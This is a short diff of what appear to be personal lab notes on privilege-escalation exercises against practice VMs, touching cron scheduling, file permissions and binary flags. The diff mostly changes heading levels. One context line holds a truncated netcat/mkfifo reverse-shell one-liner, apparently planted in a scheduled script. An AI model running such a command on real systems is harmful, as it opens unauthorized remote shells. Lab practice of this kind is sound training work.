@@ -1,5 +1,5 @@
 
-###### 18.3.5.2
+# 18.3.5.2
 On the target VM #1, use an appropriate privilege escalation technique to gain access to root and read the flag.Scheduling is all that matters.  
   
   
@@ -42,7 +42,7 @@ echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <
 
 
 
-###### 18.3.5.3
+# 18.3.5.3
 On the target VM #2, use another appropriate privilege escalation technique to gain access to root and read the flag. Take a closer look at file permissions.  
   
 So damn easy
@@ -63,7 +63,7 @@ Password: 
 
 
 
-###### 18.3.5.4
+# 18.3.5.4
 Again, use an appropriate privilege escalation technique to gain access to root and read the flag on the target VM #3.Binary flags and custom shell are what to look for.  
   
 Also so damn easy..... like, I literally laughed.  
